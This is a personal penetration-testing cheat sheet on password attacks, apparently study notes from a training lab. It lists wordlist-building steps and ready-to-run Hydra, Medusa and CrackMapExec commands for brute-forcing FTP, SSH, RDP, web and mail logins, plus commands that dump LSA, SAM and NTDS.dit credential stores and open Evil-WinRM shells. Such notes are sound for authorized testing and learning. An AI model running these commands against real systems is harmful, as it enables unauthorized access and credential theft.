---
tags: [basics, technique, password]
---


> [!info] See also: [[Hydra]] · [[Medusa]] · [[John The Ripper]] · [[Hashcat]] · [[Password Cracking]]


## Authentication Backgrounds 

![[linux_shadow_file_format.png]]
![[linux_hash_algorithm_ids.png]]


### Windows Authentication Process
![[windows_auth_process.png]]


- [Credentials Processes in Windows Authentication | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)

![[windows_logon_process.png]]


## Credential Stuffing 

![[credential_stuffing.png]]

Use of leaked credentials from breach dumps against unrelated services. Drives the need for password hygiene + MFA.


## Hybrid Attacks 
When working with Hybrid attacks we can use, what we know to refine an existing dictionary or build a new one with a proper basis 

```bash
# Fetch the content of a darkweb list 
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt

# Use grep to get the elements which fulfill the min length requirement
grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt

# Then we can also filter make sure that the password has at least one uppercase letter
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```


## Using username-anarchy to create username list

When attacking an AD, we sometimes have to create some username lists. Manually or using a tool such as [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy):

```bash
# Installation
git clone https://github.com/urbanadventurer/username-anarchy.git

# Generate Username Variations 
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## Using Cupp to generate password lists based on OSINT

```bash
# Fill out the cupp information in an interactive manner
cupp -i

# Use the generated list and filter based on your requirements using grep
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

## Password Reuse / Default Passwords 

- [ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) - Default credentials reference list.


## Using Medusa for Attacks 

```bash
# FTP Attack 
medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt

# HTTP Attack 
medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^

# SSH Attack; with the -t we can add more parallel sessions
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh -t


# IMAP.... There are more modules, but for that just checkout the documentation
medusa -M imap -h mail.example.com -U users.txt -P passwords.txt 

```

## Using Hydra for Attacks 

```bash

## ----------- General Commands ---------------

# Attacking multiple targets
hydra -l root -p toor -M targets.txt ssh

# Testing FTP on non standard port 
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp

# Brute Forcing rdp login with password combination including lower,uppercase and numbers.
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp

## ----------- Attacking specific Services ---------------
# FTP Attack
hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100

# SSH Attack
hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100

# Attack Webrequest 
hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# smtp
hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com

# pop3
hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com

# IMAP
hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com

# mysql
hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100

# RDP
hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100

```


## Network-Based Cracking with NetExec / CrackMapExec

[[NetExec]] (formerly CrackMapExec) lets you spray credentials across SMB/WinRM/RDP/MSSQL/LDAP:

```bash
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

# Initial foothold against an AD Controller using a password list
crackmapexec smb <ip> -u username -p <passwordlist> 

# Dump LSA secrets and SAM remotely
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

# Capture NTDS.dit remotely once you have DA-equivalent rights
crackmapexec smb <ip> -u <username> -p <password> --ntds 
```


## Evil-WinRM (post-credential)

Once you have a valid Windows credential and port 5985/5986 is open, [[Evil-Winrm]]:

```bash
evil-winrm -i <target-IP> -u <username> -p <password>
```
